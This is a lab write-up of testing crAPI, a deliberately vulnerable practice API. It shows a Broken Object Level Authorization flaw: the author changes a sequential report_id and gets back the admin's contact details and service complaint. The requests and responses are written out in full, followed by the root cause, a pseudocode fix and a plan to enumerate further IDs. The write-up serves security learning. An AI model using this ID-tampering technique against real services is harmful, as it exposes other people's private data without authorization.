# BOLA on Mechanic Reports Including Admin's PII

## Why I looked here

Having confirmed BOLA on the vehicle location endpoint, the natural next step was to look for the same pattern of trusting a client-supplied ID without checking ownership anywhere else in crAPI. The workshop feature, where you ask a mechanic to look at your car, seemed like a good candidate. Anything that produces a "report" for a given request is typically organized around some sort of ID, and IDs were what I had learned to go after.

## Setting up the test

First I submitted a normal service request, the way any user would:

```
POST /workshop/api/merchant/contact_mechanic
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtdWl6c*************

{
  "mechanic_code": "TRAC_JME",
  "problem_details": "brake not responding fast recently.",
  "vin": "9ENWPB360A1H5YWHU",
  "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

The response handed back a direct link to the report it just created:

```json
{
  "response_from_mechanic_api": {
    "id": 7,
    "sent": true,
    "report_link": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=7"
  },
  "status": 200
}
```

That `report_id=7` sitting right there in a plain query parameter was the first thing that caught my eye. Sequential, numeric, and handed to me directly, exactly the shape of identifier that's usually worth testing.

[Original mechanic service request and response](screenshots/original-mechanic-request-response.png)

## Testing the boundary

Then I just changed the number. Nothing else about the request changed, same token, same headers, just `report_id=5` instead of `7`:

```
GET /workshop/api/mechanic/mechanic_report?report_id=5
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtdWl6c*********
```

And the API handed back someone else's report entirely:

```json
{
  "id": 5,
  "mechanic": {
    "id": 2,
    "mechanic_code": "TRAC_JME",
    "user": {
      "email": "james@example.com",
      "number": ""
    }
  },
  "vehicle": {
    "id": 5,
    "vin": "6NBBY70FWUM324316",
    "owner": {
      "email": "admin@example.com",
      "number": "9010203040"
    }
  },
  "problem_details": "My car Audi - RS7 is having issues.\nCan you give me a call on my mobile 9010203040,\nOr send me an email at admin@example.com\nThanks,\nAdmin.\n",
  "status": "pending"
}
```

No error, no ownership check, nothing. My token, someone else's report and in this case, not just "someone else," but the platform's admin account. Full name context, phone number, email, and the actual service complaint they submitted, all handed to a completely unrelated user just for guessing a slightly smaller number.

[Modified mechanic service request and response](screenshots/modified-mechanic-request-response.png)

## What this actually confirms

| Check | Result |
|---|---|
| Token belongs to | `muizrecon@apisecurity.com` |
| Data returned belongs to | `admin@example.com` |
| Ownership check performed | No |
| Verdict | BOLA confirmed |

This is the same root cause as the vehicle location finding, an endpoint that trusts a client-supplied ID without checking whether it belongs to the requester, just on a completely different feature. Two unrelated endpoints, same missing control. That's not a coincidence; it points to ownership validation not being a consistent pattern anywhere in this API, rather than a one-off oversight on a single route.

## Root cause

Same structural issue as the location endpoint: the server accepts `report_id` as-is and returns whatever record matches, without ever checking that the authenticated user has a legitimate relationship to it, whether that's owning the vehicle or being the assigned mechanic.

## How I'd fix it

```pseudo
if report.vehicle.owner_id != authenticated_user.id
   and report.mechanic.user_id != authenticated_user.id:
    return 403 Forbidden
```

The important part isn't the specific code, it's recognizing that ownership isn't always a single relationship. Any endpoint that can be reached by more than one legitimate role needs its authorization check to reflect that, not just the simplest case.

## Where this fits

**API1:2023 – Broken Object Level Authorization**, same category as the vehicle location finding. Given that this is now the second unrelated endpoint with the identical gap, it's worth treating this as a systemic pattern in how crAPI handles authorization generally, not two isolated bugs.

---

**Lesson I'm taking forward:** this is the second time a sequential or predictable ID handed directly to me in a response turned into a full BOLA. At this point that's not a coincidence, it's a pattern I should assume by default in this app, any time an endpoint response includes an `id` I didn't choose myself, my first move should be trying an adjacent value before I do anything else. Next step: finish enumerating reports 1-4, then decide whether it's worth checking if this same ID also exposes anything through other workshop endpoints, the way vehicleId did across multiple vehicle routes.
